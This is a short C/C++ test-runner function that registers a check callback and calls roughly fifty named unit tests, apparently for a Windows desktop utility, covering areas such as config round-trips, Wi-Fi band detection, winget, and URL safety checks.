void TestMore(void (*check)(bool, const char*, int)) {
    g_check = check;
    TestConfigRoundTrip();
    TestEdgeCheck();
    TestDropUndo();
    TestRules();
    TestSettingsPack();
    TestHealthScore();
    TestProcSession();
    TestDayTint();
    TestSpeedLog();
    TestWeekDiff();
    TestQr();
    TestExtRights();
    TestSafeUrl();
    TestImportant();
    TestWifiBand();
    TestScanCache();
    TestCfgDiff();
    TestWeekReport();
    TestWeekWaste();
    TestAppHealth();
    TestCardLog();
    TestUsage();
    TestJournalUndo();
    TestBuildErr();
    TestDevServers();
    TestProjectPorts();
    TestDrain();
    TestAppVolume();
    TestResume();
    TestAfterWork();
    TestGamePrep();
    TestPowerPick();
    TestFocus();
    TestProjVer();
    TestPlanLaunch();
    TestWinget();
    TestContests();
    TestShutUpCatalog();
    TestExplain();
    TestShutUpExtras();
    TestSecurityHeuristics();
    TestSysItemOff();
    TestModeSwitch();
    TestModeStats();
    TestShareMask();
    TestSelRing();
    TestSnipName();
    TestMarkup();
}
